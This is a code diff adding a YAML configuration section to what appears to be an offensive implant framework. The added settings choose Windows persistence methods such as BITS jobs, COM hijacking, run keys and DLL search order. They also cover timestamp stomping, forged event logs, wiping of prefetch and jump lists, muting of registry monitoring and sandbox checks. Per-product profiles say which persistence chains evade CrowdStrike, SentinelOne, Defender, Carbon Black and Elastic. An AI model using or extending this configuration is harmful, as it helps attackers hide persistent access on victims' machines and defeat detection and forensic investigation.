@@ -472,6 +472,172 @@ edr_syscall_profiles:
     delay_range_ms: [5, 20]
     notes: "No EDR - use basic indirect calls for reliability"
 
+# === NEW: Persistence God Mode Settings ===
+persistence_god:
+  enabled: true
+  
+  # AI-Dynamic chain selection
+  ai_adaptive: true
+  auto_detect_edr: true
+  
+  # Primary persistence chain
+  # Options: wmi_event, com_hijack, bits_job, schtask, runkey, service, dll_search, startup_folder, full_chain
+  primary_chain: "bits_job"
+  
+  # Multi-chain persistence
+  multi_chain:
+    enabled: true
+    chains:
+      - "bits_job"
+      - "com_hijack"
+      - "runkey"
+    install_delay_between: [2000, 8000]  # ms between chain installs
+  
+  # Artifact mutation
+  mutation:
+    enabled: true
+    mutation_rate: 0.7
+    targets:
+      - "registry_key"
+      - "registry_value"
+      - "file_path"
+      - "task_name"
+      - "service_name"
+      - "com_clsid"
+      - "bits_job_name"
+    use_legit_prefixes: true  # Windows, Microsoft, System prefixes
+    reseed_after_install: true
+  
+  # Timestamp manipulation
+  timestamp_stomp:
+    enabled: true
+    reference_dir: "C:\\Windows\\System32"  # Match timestamps from here
+    spread_days: 365  # Random timestamp spread
+  
+  # Spoof events (log forging)
+  spoof_events:
+    enabled: true
+    spoof_before_install: true
+    spoof_after_install: true
+    event_count: [3, 7]  # Random count per install
+    event_types:
+      - "schtask_create"
+      - "schtask_delete"
+      - "registry_set"
+      - "file_create"
+  
+  # Artifact wiping
+  artifact_wipe:
+    enabled: true
+    targets:
+      - "prefetch"
+      - "recent"
+      - "temp"
+      - "jump_lists"
+    wipe_after_install: true
+  
+  # Registry muting
+  reg_muting:
+    enabled: true
+    mute_duration_ms: 5000  # Mute monitoring briefly during write
+  
+  # OPSEC Layer
+  opsec:
+    check_sandbox: true
+    check_vm: true
+    check_debugger: true
+    check_av_running: true
+    min_uptime_minutes: 5  # Don't persist immediately
+    kill_date: null  # Remove persistence after this date
+
+# EDR-specific persistence profiles
+edr_persistence_profiles:
+  crowdstrike_falcon:
+    primary_chain: "com_hijack"
+    secondary_chains:
+      - "bits_job"
+      - "dll_search"
+    avoid_chains:
+      - "schtask"
+      - "wmi_event"
+    mutation_rate: 0.9
+    use_reg_muting: true
+    timestamp_stomp: true
+    spoof_events: true
+    install_delay_ms: [5000, 15000]
+    notes: "Falcon monitors scheduled tasks heavily - use COM hijack primary"
+  
+  sentinelone:
+    primary_chain: "bits_job"
+    secondary_chains:
+      - "com_hijack"
+      - "dll_search"
+    avoid_chains:
+      - "service"
+      - "schtask"
+    mutation_rate: 0.9
+    use_reg_muting: true
+    timestamp_stomp: true
+    spoof_events: true
+    install_delay_ms: [3000, 10000]
+    notes: "S1 watches service creation - use BITS for reliability"
+  
+  defender_atp:
+    primary_chain: "runkey"
+    secondary_chains:
+      - "bits_job"
+      - "com_hijack"
+    avoid_chains:
+      - "wmi_event"
+      - "service"
+    mutation_rate: 0.8
+    use_reg_muting: true
+    timestamp_stomp: true
+    spoof_events: true
+    install_delay_ms: [2000, 8000]
+    notes: "Defender has WMI visibility - registry persistence with muting"
+  
+  carbon_black:
+    primary_chain: "dll_search"
+    secondary_chains:
+      - "com_hijack"
+      - "bits_job"
+    avoid_chains:
+      - "wmi_event"
+      - "service"
+    mutation_rate: 0.7
+    use_reg_muting: false
+    timestamp_stomp: true
+    spoof_events: true
+    install_delay_ms: [2500, 7000]
+    notes: "CB behavior analysis - DLL search order is stealthiest"
+  
+  elastic_edr:
+    primary_chain: "bits_job"
+    secondary_chains:
+      - "runkey"
+      - "com_hijack"
+    avoid_chains:
+      - "wmi_event"
+    mutation_rate: 0.6
+    use_reg_muting: true
+    timestamp_stomp: true
+    spoof_events: false
+    install_delay_ms: [1500, 5000]
+    notes: "Elastic has WMI rules - BITS + registry combo"
+  
+  none:
+    primary_chain: "schtask"
+    secondary_chains:
+      - "runkey"
+    avoid_chains: []
+    mutation_rate: 0.3
+    use_reg_muting: false
+    timestamp_stomp: false
+    spoof_events: false
+    install_delay_ms: [500, 2000]
+    notes: "No EDR - use reliable scheduled task"
+
 # Logging
 logging:
   enabled: false
